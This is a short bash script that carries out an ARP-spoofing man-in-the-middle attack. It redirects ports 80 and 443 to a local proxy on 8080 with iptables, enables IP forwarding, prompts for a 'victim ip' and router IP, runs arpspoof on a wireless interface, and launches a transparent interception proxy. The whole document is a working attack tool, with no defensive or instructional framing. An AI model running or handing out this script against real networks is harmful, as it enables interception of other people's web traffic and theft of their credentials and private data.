#!/bin/bash
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080
echo "1" > /proc/sys/net/ipv4/ip_forward
while [ "$net" = "" ]; do
    echo -n "Enter victim ip and  router ip with space "
    read net
    if [ -n "$net" ]; then
        arpspoof -i wlp3s0 -t $net &
        xterm -e "./mitm --mode transparent"
    fi
    killall arpspoof
done
